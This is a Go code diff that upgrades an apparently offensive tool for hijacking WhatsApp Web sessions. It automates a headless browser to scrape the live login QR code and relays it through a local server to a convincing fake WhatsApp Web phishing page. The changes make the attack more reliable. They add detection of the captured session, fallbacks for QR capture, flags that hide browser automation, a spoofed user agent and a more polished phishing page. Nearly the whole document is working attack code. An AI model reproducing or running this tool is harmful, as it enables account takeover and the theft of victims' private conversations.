@@ -31,6 +31,28 @@ var (
 	reloadBtnSelector = "button[aria-label='Scan QR code']"
 )
 
+const sessionDetectJS = `
+(() => {
+	const canvases = document.querySelectorAll('canvas');
+	let hasQR = false;
+	for (const c of canvases) {
+		if (c.offsetParent !== null && c.width > 100) { hasQR = true; break; }
+	}
+	if (hasQR) return false;
+	const checks = [
+		'div[data-testid="chat-list"]',
+		'div[data-testid="conversation-panel-header"]',
+		'div[data-testid="conversation-panel"]',
+		'header[data-testid="conversation-header"]',
+		'div[role="navigation"]',
+		'div[aria-label*="Chat list"]',
+		'div[aria-label*="Search"]',
+		'header',
+	];
+	return checks.some(function(s){return document.querySelector(s)});
+})()
+`
+
 type sessionMeta struct {
 	ID        string `json:"id"`
 	Timestamp string `json:"timestamp"`
@@ -199,24 +221,55 @@ func launchAttack(cfg attackCfg) {
 		utils.PauseForInput()
 		return
 	}
-	fmt.Printf("%s[+] Navigating to web.whatsapp.com...%s\n", utils.Green, utils.Reset)
-	time.Sleep(5 * time.Second)
+	fmt.Printf("%s[+] Loading web.whatsapp.com...%s\n", utils.Green, utils.Reset)
+
+	var pageReady bool
+	for i := 0; i < 30; i++ {
+		err := chromedp.Run(tabCtx, chromedp.Evaluate(`document.readyState`, &pageReady))
+		if err == nil && pageReady {
+			break
+		}
+		time.Sleep(1 * time.Second)
+	}
+
+	var debugScreenshot []byte
+	chromedp.Run(tabCtx, chromedp.FullScreenshot(&debugScreenshot, 90))
+	if len(debugScreenshot) > 0 {
+		os.MkdirAll(wwwDir, 0755)
+		os.WriteFile(filepath.Join(wwwDir, "debug_whatsapp.png"), debugScreenshot, 0644)
+		fmt.Printf("%s[+] Debug screenshot saved to %s/debug_whatsapp.png%s\n", utils.Green, wwwDir, utils.Reset)
+	}
 
 	var currentQR []byte
 	var qrMu sync.Mutex
 
+	addrCh := make(chan string, 1)
 	serverDone := make(chan struct{})
-	go runServer(cfg.Port, cfg.Host, &qrMu, &currentQR, serverDone)
+	go runServer(cfg.Host, cfg.Port, &qrMu, &currentQR, addrCh, serverDone)
+
+	select {
+	case actualAddr := <-addrCh:
+		cfg.Host, cfg.Port = parseAddr(actualAddr)
+	case <-time.After(3 * time.Second):
+		fmt.Printf("%s[!] Server failed to start%s\n", utils.Red, utils.Reset)
+		utils.PauseForInput()
+		return
+	}
 
 	ip := utils.GetLocalIP()
 	attackURL := fmt.Sprintf("http://%s:%d", ip, cfg.Port)
-	fmt.Printf("\n%s[+] Attack server at %s%s\n", utils.Green, attackURL, utils.Reset)
-	fmt.Printf("%s[+] QR code: %s/qr.png%s\n", utils.Green, attackURL, utils.Reset)
-	fmt.Printf("%s[+] Opening phishing page in default browser...%s\n", utils.Yellow, utils.Reset)
+	localURL := fmt.Sprintf("http://127.0.0.1:%d", cfg.Port)
 
-	utils.OpenURL(attackURL)
+	fmt.Printf("\n%s[+] Server: %s%s\n", utils.Green, attackURL, utils.Reset)
+	fmt.Printf("%s[+] Local:  %s%s\n", utils.Green, localURL, utils.Reset)
 
-	fmt.Printf("%s[+] Waiting for victim to scan QR code...%s\n\n", utils.Yellow, utils.Reset)
+	fmt.Printf("%s[+] Opening %s in your browser...%s\n", utils.Yellow, localURL, utils.Reset)
+	openErr := utils.OpenURL(localURL)
+	if openErr != nil {
+		exec.Command("zen-browser", "--new-tab", localURL).Start()
+	}
+
+	fmt.Printf("%s[+] Waiting for victim to scan the QR code...\n\n%s", utils.Yellow, utils.Reset)
 
 	start := time.Now()
 	timeout := 10 * time.Minute
@@ -229,39 +282,26 @@ func launchAttack(cfg attackCfg) {
 		default:
 		}
 
+		captureQR(tabCtx, &qrMu, &currentQR)
+
+		var dummy string
 		var reloadExists bool
 		chromedp.Run(tabCtx, chromedp.Evaluate(
 			fmt.Sprintf(`!!document.querySelector('%s')`, reloadBtnSelector), &reloadExists))
 		if reloadExists {
-			var dummy string
 			chromedp.Run(tabCtx, chromedp.Evaluate(
 				fmt.Sprintf(`(()=>{const b=document.querySelector('%s');if(b)b.click()})()`, reloadBtnSelector), &dummy))
-			time.Sleep(2 * time.Second)
-		}
-
-		var dataURL string
-		err := chromedp.Run(tabCtx, chromedp.Evaluate(
-			fmt.Sprintf(`(()=>{const c=document.querySelector('%s');if(!c)return '';try{return c.toDataURL()}catch(e){return ''}})()`, qrCanvasSelector), &dataURL))
-		if err == nil && len(dataURL) > 50 {
-			b64 := strings.TrimPrefix(dataURL, "data:image/png;base64,")
-			decoded, decErr := base64.StdEncoding.DecodeString(b64)
-			if decErr == nil {
-				qrMu.Lock()
-				currentQR = decoded
-				qrMu.Unlock()
-			}
 		}
 
 		var hasSession bool
-		err = chromedp.Run(tabCtx, chromedp.Evaluate(
-			fmt.Sprintf(`!!document.querySelector('%s')`, sessionSelector), &hasSession))
-		if err == nil && hasSession {
+		chromedp.Run(tabCtx, chromedp.Evaluate(sessionDetectJS, &hasSession))
+		if hasSession {
 			fmt.Printf("\n%s[+] SESSION CAPTURED! Victim scanned the QR code!%s\n", utils.Green, utils.Reset)
 			sessionCaptured = true
 			break
 		}
 
-		time.Sleep(2 * time.Second)
+		time.Sleep(time.Second)
 	}
 
 	close(serverDone)
@@ -273,6 +313,53 @@ func launchAttack(cfg attackCfg) {
 	}
 
 	utils.PauseForInput()
+}
+
+func captureQR(tabCtx context.Context, qrMu *sync.Mutex, currentQR *[]byte) {
+	var dataURL string
+	err := chromedp.Run(tabCtx, chromedp.Evaluate(`
+		(() => {
+			const canvases = document.querySelectorAll('canvas');
+			let best = null;
+			for (const c of canvases) {
+				if (c.width > 50 && c.height > 50 && c.offsetParent !== null) {
+					if (!best || (c.width > best.width && c.height > best.height)) best = c;
+				}
+			}
+			if (!best) return '';
+			try { return best.toDataURL('image/png'); } catch(e) { return ''; }
+		})()
+	`, &dataURL))
+
+	if err == nil && len(dataURL) > 100 {
+		b64 := strings.TrimPrefix(dataURL, "data:image/png;base64,")
+		decoded, decErr := base64.StdEncoding.DecodeString(b64)
+		if decErr == nil && len(decoded) > 500 && isPNG(decoded) {
+			qrMu.Lock()
+			*currentQR = decoded
+			qrMu.Unlock()
+			return
+		}
+	}
+
+	var qrScreenshot []byte
+	err = chromedp.Run(tabCtx, chromedp.Screenshot(`canvas`, &qrScreenshot, chromedp.NodeVisible, chromedp.ByQueryAll))
+	if err == nil && len(qrScreenshot) > 500 && isPNG(qrScreenshot) {
+		qrMu.Lock()
+		*currentQR = qrScreenshot
+		qrMu.Unlock()
+		return
+	}
+
+	var fullPage []byte
+	err = chromedp.Run(tabCtx, chromedp.FullScreenshot(&fullPage, 90))
+	if err == nil && len(fullPage) > 2000 {
+		os.WriteFile(filepath.Join(wwwDir, "debug_fullpage.png"), fullPage, 0644)
+	}
+}
+
+func isPNG(b []byte) bool {
+	return len(b) > 8 && b[0] == 137 && b[1] == 80 && b[2] == 78 && b[3] == 71
 }
 
 func findChrome() string {
@@ -293,13 +380,14 @@ func findChrome() string {
 }
 
 func startChrome(binary, userDir string) (context.Context, context.CancelFunc, error) {
-	opts := []chromedp.ExecAllocatorOption{
-		chromedp.NoFirstRun,
-		chromedp.NoDefaultBrowserCheck,
-		chromedp.Headless,
-		chromedp.DisableGPU,
+	opts := append(chromedp.DefaultExecAllocatorOptions[:],
+		chromedp.NoSandbox,
+		chromedp.Flag("disable-blink-features", "AutomationControlled"),
+		chromedp.Flag("disable-background-timer-throttling", true),
+		chromedp.Flag("disable-renderer-backgrounding", true),
+		chromedp.UserAgent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"),
 		chromedp.UserDataDir(userDir),
-	}
+	)
 	if binary != "" {
 		opts = append(opts, chromedp.ExecPath(binary))
 	}
@@ -307,26 +395,33 @@ func startChrome(binary, userDir string) (context.Context, context.CancelFunc, e
 	return allocCtx, cancel, nil
 }
 
-func runServer(port int, host string, qrMu *sync.Mutex, currentQR *[]byte, done chan struct{}) {
+func runServer(host string, port int, qrMu *sync.Mutex, currentQR *[]byte, addrCh chan<- string, done chan struct{}) {
 	mux := http.NewServeMux()
 
-	phishingHTML := `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WhatsApp Web</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:"Segoe UI","Helvetica Neue",Helvetica,Arial,sans-serif;background:#f0f2f5;height:100vh;display:flex;flex-direction:column;overflow:hidden}.top-bar{background:#00a884;height:8px;flex-shrink:0}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,0.08);display:flex;flex-direction:row;max-width:960px;width:100%;min-height:480px;overflow:hidden}.left{flex:1;padding:48px 40px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}.left h1{font-size:26px;font-weight:300;color:#41525d;margin-bottom:8px}.left p{font-size:14px;color:#667781;line-height:1.5;max-width:280px;margin-bottom:24px}.left .steps{text-align:left;font-size:14px;color:#41525d;line-height:1.8;max-width:280px}.left .steps span{color:#00a884;font-weight:600;margin-right:6px}.right{flex:1;background:#fdfeff;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px;border-left:1px solid #e9edef}.right .qr-wrap{border:2px solid #00a884;border-radius:12px;padding:10px;margin-bottom:16px;background:#fff}.right .qr-wrap img{display:block;width:224px;height:224px}.right .actions{display:flex;gap:8px}.right .actions a{display:inline-block;padding:8px 20px;border-radius:20px;font-size:13px;text-decoration:none;cursor:pointer}.right .actions .link{background:transparent;color:#00a884;border:1px solid #dadfe3}.right .actions .refresh{background:#00a884;color:#fff;border:none;font-weight:500}.footer{text-align:center;padding:16px;font-size:12px;color:#8696a0;background:#f0f2f5;flex-shrink:0}.footer a{color:#00a884;text-decoration:none}@media(max-width:720px){.card{flex-direction:column-reverse;min-height:auto}.left,.right{padding:24px}.right .qr-wrap img{width:180px;height:180px}}</style></head><body><div class="top-bar"></div><div class="main"><div class="card"><div class="left"><h1>Use WhatsApp on your computer</h1><p>To use WhatsApp on your computer, scan this QR code with your phone.</p><div class="steps"><p><span>1</span> Open WhatsApp on your phone</p><p><span>2</span> Tap <strong>Menu</strong> or <strong>Settings</strong> and select <strong>Linked Devices</strong></p><p><span>3</span> Point your phone at this screen</p></div></div><div class="right"><div class="qr-wrap"><img id="qr" src="/qr.png" alt="QR Code"></div><div class="actions"><a class="link" href="#">Trouble scanning?</a><a class="refresh" href="#" onclick="document.getElementById('qr').src='/qr.png?t='+Date.now()">Refresh</a></div></div></div></div><div class="footer"><a href="#">Tutorial</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="#">Privacy</a></div><script>setInterval(function(){document.getElementById('qr').src='/qr.png?t='+Date.now()},4000)</script></body></html>`
+	phishingHTML := `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>WhatsApp Web</title><style>*{margin:0;padding:0;box-sizing:border-box}html,body{height:100%}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;flex-direction:column;overflow:hidden;color:#41525d}.top-bar{background:#00a884;height:6px;flex-shrink:0}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.06);display:flex;flex-direction:row;max-width:1000px;width:100%;min-height:520px;overflow:hidden}.left{flex:1.1;padding:56px 48px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}.left .logo{margin-bottom:16px}.left .logo svg{width:48px;height:48px}.left h1{font-size:28px;font-weight:275;color:#41525d;margin-bottom:10px;letter-spacing:-0.3px}.left .sub{font-size:15px;color:#667781;line-height:1.5;max-width:300px;margin-bottom:28px}.left .steps-wrap{background:#f9fafb;border-radius:12px;padding:20px 24px;text-align:left;width:100%;max-width:320px}.left .steps-wrap .step{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px;font-size:14px;color:#3b4a54;line-height:1.5}.left .steps-wrap .step:last-child{margin-bottom:0}.left .steps-wrap .num{background:#00a884;color:#fff;border-radius:50%;width:22px;height:22px;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600;flex-shrink:0;margin-top:1px}.left .steps-wrap .step strong{color:#1f2a30}.right{flex:1;background:#fcfdfd;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:48px 40px;border-left:1px solid #e9edef;position:relative}.right .qr-label{font-size:13px;color:#8696a0;margin-bottom:14px;text-transform:uppercase;letter-spacing:1px}.right .qr-border{border:3px solid #00a884;border-radius:16px;padding:12px;background:#fff;box-shadow:0 1px 6px rgba(0,168,132,0.12);margin-bottom:18px}.right .qr-border img{display:block;width:240px;height:240px;border-radius:4px}.right .qr-border .placeholder{width:240px;height:240px;display:flex;align-items:center;justify-content:center;background:#f8f9fa;border-radius:4px;color:#a0acb5;font-size:13px}.right .actions{display:flex;gap:10px;margin-top:4px}.right .actions a{display:inline-block;padding:8px 22px;border-radius:24px;font-size:13px;text-decoration:none;cursor:pointer;transition:all .15s}.right .actions .refresh{background:#00a884;color:#fff;border:none;font-weight:500}.right .actions .refresh:hover{background:#009972}.right .actions .link{background:transparent;color:#00a884;border:1px solid #d9dee0}.right .actions .link:hover{background:#f0faf8}.footer{text-align:center;padding:18px;font-size:12px;color:#8696a0;background:#f0f2f5;flex-shrink:0;border-top:1px solid #e9edef}.footer a{color:#00a884;text-decoration:none;margin:0 10px}.footer a:hover{text-decoration:underline}@media(max-width:800px){.card{flex-direction:column-reverse;min-height:auto;border-radius:0}.left,.right{padding:28px 20px;border-left:none}.left .steps-wrap{max-width:100%}.right .qr-border img{width:200px;height:200px}.right .qr-border .placeholder{width:200px;height:200px}}@media(max-width:480px){.main{padding:0}.card{box-shadow:none}.left h1{font-size:22px}}</style></head><body><div class="top-bar"></div><div class="main"><div class="card"><div class="left"><div class="logo"><svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path fill="#00a884" d="M24 0C10.8 0 0 10.8 0 24c0 4.8 1.4 9.2 3.8 13L1.2 46.8 12 43.2c3.6 2 7.8 3.2 12 3.2 13.2 0 24-10.8 24-24S37.2 0 24 0z"/><path fill="#fff" d="M33.6 28.8c-.6-.3-3.6-1.8-4.2-2-.6-.2-1-.3-1.4.3-.4.6-1.6 2-2 2.4-.4.4-.8.4-1.4.1-.6-.3-2.4-.9-4.6-2.8-1.7-1.5-2.8-3.3-3.2-3.9-.3-.6 0-.9.3-1.2.3-.3.6-.6.8-.9.3-.3.4-.6.6-.9.2-.3.1-.6-.1-.9-.2-.3-1.4-3.4-1.9-4.6-.5-1.2-1-1-1.4-1-.4 0-.8-.1-1.2-.1-.4 0-1.1.2-1.7.8-.6.6-2.2 2.2-2.2 5.3s2.2 6.2 2.6 6.6c.3.4 4.4 7 10.8 9.6 1.5.6 2.7 1 3.6 1.3 1.5.5 2.9.4 4 .3 1.2-.1 3.8-1.5 4.3-3 .5-1.4.5-2.6.4-2.9-.2-.3-.6-.5-1.1-.8z"/></svg></div><h1>Use WhatsApp on your computer</h1><p class="sub">To use WhatsApp on your computer, scan this QR code with your phone.</p><div class="steps-wrap"><div class="step"><span class="num">1</span><span>Open <strong>WhatsApp</strong> on your phone</span></div><div class="step"><span class="num">2</span><span>Tap <strong>Menu</strong> or <strong>Settings</strong> and select <strong>Linked Devices</strong></span></div><div class="step"><span class="num">3</span><span>Point your phone at this screen</span></div></div></div><div class="right"><div class="qr-label">Scan QR Code</div><div class="qr-border"><img id="qr" src="/qr.png" alt="QR Code" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><div class="placeholder" style="display:none">Loading QR code…</div></div><div class="actions"><a class="link" href="#">Keep QR visible</a><a class="refresh" href="#" onclick="document.getElementById('qr').src='/qr.png?t='+Date.now()">Refresh</a></div></div></div></div><div class="footer"><a href="#">Get WhatsApp for Windows</a><a href="#">Tutorial</a><a href="#">Privacy Policy</a></div><script>setInterval(function(){var e=document.getElementById('qr');e.src='/qr.png?t='+Date.now()},4000)</script></body></html>`
 
 	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "text/html; charset=utf-8")
+		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
 		w.Write([]byte(phishingHTML))
 	})
 
 	mux.HandleFunc("/qr.png", func(w http.ResponseWriter, r *http.Request) {
 		qrMu.Lock()
-		data := *currentQR
+		data := make([]byte, len(*currentQR))
+		copy(data, *currentQR)
 		qrMu.Unlock()
 		if len(data) == 0 {
-			http.Error(w, "QR not available yet", http.StatusNotFound)
+			w.Header().Set("Content-Type", "text/plain")
+			w.Header().Set("Cache-Control", "no-cache")
+			w.WriteHeader(http.StatusNotFound)
+			w.Write([]byte("QR not available yet"))
 			return
 		}
 		w.Header().Set("Content-Type", "image/png")
 		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
+		w.Header().Set("Pragma", "no-cache")
+		w.Header().Set("Expires", "0")
 		w.Write(data)
 	})
 
@@ -336,10 +431,11 @@ func runServer(port int, host string, qrMu *sync.Mutex, currentQR *[]byte, done 
 		listener, err = net.Listen("tcp", ":0")
 		if err != nil {
 			fmt.Printf("%s[!] Failed to start HTTP server: %v%s\n", utils.Red, err, utils.Reset)
+			addrCh <- ""
 			return
 		}
-		addr = listener.Addr().String()
 	}
+	addrCh <- listener.Addr().String()
 
 	srv := &http.Server{Handler: mux}
 	go func() {
@@ -347,6 +443,16 @@ func runServer(port int, host string, qrMu *sync.Mutex, currentQR *[]byte, done 
 		srv.Close()
 	}()
 	srv.Serve(listener)
+}
+
+func parseAddr(addr string) (string, int) {
+	host, portStr, err := net.SplitHostPort(addr)
+	if err != nil {
+		return "0.0.0.0", 8080
+	}
+	port := 8080
+	fmt.Sscanf(portStr, "%d", &port)
+	return host, port
 }
 
 func saveSession(profileDir, browser, url string) {
